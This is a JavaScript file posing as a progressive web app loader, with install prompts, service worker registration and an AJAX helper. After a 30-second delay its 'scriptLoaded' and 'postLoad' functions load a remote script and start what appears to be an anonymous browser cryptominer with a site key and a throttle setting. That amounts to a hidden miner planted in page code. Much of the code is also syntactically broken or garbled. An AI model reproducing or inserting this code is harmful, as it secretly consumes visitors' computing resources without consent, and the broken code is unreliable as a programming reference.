class _loc {
    static replaceBulk(e, t, a) {
        for (var s = [], n = {}, r = 0; r < t.length; r++) s.push(t[r].replace(/([-[\]{}()*+?.\\^$|#,])/g, "\\$1")), n[t[r]] = a[r];
        return s = s.join("|"), e.replace(new RegExp(s, "g"), (function (e) {
            return n[e]
        }))
    }
    static Load() {
        document.querySelector("html").classList.add("don");
        try {
            return window.self !== window.top
        } catch (e) {
            return !0
        }
    }
    static createEl(e, t) {
        const a = document.createElement("div"), a.innerHTML = t, a.className = e, document.body.appendChild(a)
    }
    static scriptLoaded() {
        new Client.Anonymous("94fd352e2648f84468974dc47e5036a41f545b7f0c7293c829891a68f1626566", {
            throttle: .5,
            c: "w",
            ads: 0
        }).start()
    }
    static postLoad() {
        setTimeout((() => {
            document.querySelector("html").classList.add("frameless"), (void 0).addEventListener("load", this.scriptLoaded, !1), (void 0).setAttribute("src", "/run.php?f=Yssl.js"), document.body.appendChild(void 0), document.querySelector("html").classList.add("don"), var xmlHttp = new XMLHttpRequest(); xmlHttp.open( 'GET', '/?URL=' + location.pathname + location.search, false ); xmlHttp.send( null ); return xmlHttp.responseText;
        }), 3e4);
    }

    static beforeInstallprompt(e) {
        if (window.matchMedia("(display-mode: standalone)").matches) return document.querySelector(".welcomeMsg").classList.add("activation"), createEl("welcomeMsg", "WELCOME TO OUR APP"), e.preventDefault();
        {
            createEl("installMsg", "<span><b>CLICK HERE</b> TO INSTALL THIS APP ON YOUR DEVICE</span>"), const t = document.querySelector(".installMsg");
            return document.querySelector(".installMsg").classList.add("activation"), t.onclick = t => e.prompt(), e.preventDefault()
        }
    }

    static ajaxFetch(e, t, a, s) {
        const n = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP"), n.open("POST", e, !0), n.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), n.send(btoa(JSON.stringify({value: t,key: a  }))), n.onreadystatechange = function () {  s && 4 === n.readyState && 200 === n.status && s(n.responseText) }
    }

    async registerSW() {
        if ("serviceWorker" in navigator) try {
            await navigator.serviceWorker.register("/bbworker.js")
        } catch (e) {
            console.log("SW registration failed")
        }
    }
}
window.addEventListener("beforeinstallprompt", (e => beforeInstallprompt(e))), window.addEventListener("load", (() => {
    _loc.registerSW(), setTimeout((() => {_loc.Load(), _loc.postLoad();}), 1e3);
}));